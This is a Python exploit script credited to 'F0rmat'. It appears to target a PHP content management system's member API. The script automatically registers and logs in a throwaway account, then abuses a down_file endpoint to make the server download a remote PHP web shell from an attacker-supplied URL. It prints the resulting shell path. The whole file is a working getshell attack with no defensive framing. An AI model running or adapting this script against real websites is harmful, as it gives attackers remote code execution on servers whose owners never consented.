'''
author:F0rmat
usage:
'''
import sys
import random
import requests
import json
import time

def exploit(target,rtarget):
    username = random.randint(0, 999999)
    seed = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    email = []
    for i in range(8):
        email.append(random.choice(seed))
    email = ''.join(email)

    # step 1 register
    register_url = target + "/index.php?s=member&c=register&m=index"
    register_payload = {"back": "", "data[username]": username, "data[password]": "123456", "data[password2]": "123456",
                        "data[email]": email + "@" + email + ".com"}
    # step 2 login
    login_url = target + "/index.php?s=member&c=login&m=index"
    login_payload = {"back": "", "data[username]": username, "data[password]": "123456", "data[auto]": "1"}

    url = target+"/index.php?s=member&c=api&m=down_file"
    payload = {"url":"code=ad3eXTkH4Wt084pW46p7DBSt1KX0FwthAs4o9oBH8WVi","file":rtarget}
    # step 3 start hacking"
    s = requests.session()
    s.post(register_url, data=register_payload)
    s.post(login_url, data=login_payload)
    res=s.post(url,data=payload).content
    hjson = json.loads(res)
    if "php" in res:
        print "shell:"+target+"/uploadfile/"+time.strftime("%Y%m")+"/"+hjson['name']
    else:
        print "failure"

if len(sys.argv)<5:
    print 'python down_file_getshell.py -h http://127.0.0.1 -r http://10.0.0.1/shell.php'
else:
    target = sys.argv[2]
    rtarget = sys.argv[4]
    exploit(target,rtarget)
